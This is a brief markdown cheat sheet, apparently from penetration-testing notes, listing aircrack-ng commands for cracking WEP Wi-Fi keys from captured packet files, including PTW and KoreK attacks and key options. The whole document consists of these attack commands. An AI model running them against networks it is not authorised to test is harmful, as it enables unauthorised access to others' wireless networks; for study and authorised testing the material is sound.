# WEP Cracking Techniques

Without closing our open terminal windows let cracking the password

Cracking the key

```sh
sudo aircrack-ng -n <key_lenth> wep_file.cap
# key_lenth {64, 128}
```

PTW Attack

```sh
sudo aircrack-ng -e <ssid> wep_file*.cap
```

KoreK Attack

```sh
sudo aircrack-ng -e <ssid> -K wep_file*.cap
```

Aircrack-ng useful options :

```sh
-a <mode> : use 1 for WEP, 2 for WPA
-e <ssid> : target network SSID
-b <BSSID>: target AP's MAC adress
-w <worlists> : path to wordlist for dictionary attack
```